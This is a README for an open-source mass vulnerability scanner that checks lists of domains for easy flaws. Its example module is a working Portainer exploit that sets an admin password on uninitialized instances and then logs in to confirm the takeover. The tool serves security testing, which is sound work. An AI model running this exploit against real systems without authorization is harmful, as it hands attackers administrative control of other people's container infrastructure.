# low-hanging
Lightweight and extensible horizontal vulnerability scanner. Pass list of domains and check for low hanging fruits.

Made to be easily extensible. Adding more checks is just few lines of code with 
pre-initialized `requests-http` session ()with nice features like JS rendering).

Inspired by https://github.com/tomnomnom/meg, but made to be easily pluggable into your fully automated workflow.

## Usage
```bash
$ docker run s14ve/low-hanging --help
Usage: low_hanging.py [OPTIONS]

Options:
  -i, --input TEXT       Path to file with list of domains/IPs separated by
                         newline.
  -t, --threads INTEGER  Number of threads with which you want to run.
  -o, --output TEXT      Output files to file in json format.
  --help                 Show this message and exit.
``` 

## Adding Modules
Adding modules is quite simple, yet it requires some manual work with imports. This will get improved in the future.
For now, bear with me and check [example commit](https://github.com/janmasarik/low-hanging/commit/e2ebe80a3bb8f7c7e02c73c48e8caaeb847f18c9).

## Example Module
```python
from urllib.parse import urljoin
from low_hanging.base_worker import BaseWorker

class PortainerAdmin(BaseWorker):
    name = "portainer_admin_reset"
    references = ["https://github.com/portainer/portainer/issues/493"]
    def run(self):
        r = self.session.post(
            urljoin(self.domain, "/api/users/admin/init"),
            json={"username": "admin", "password":"definitely_valid"}
        )

        if r.status_code in (404, 409):
            r = self.session.post(
                urljoin(self.domain, "/api/auth"),
                json={"username": "admin", "password":"definitely_valid"}
            )
            if r.status_code < 400:
                return r.url  # If successful, return the URL for which the exploit is valid
```
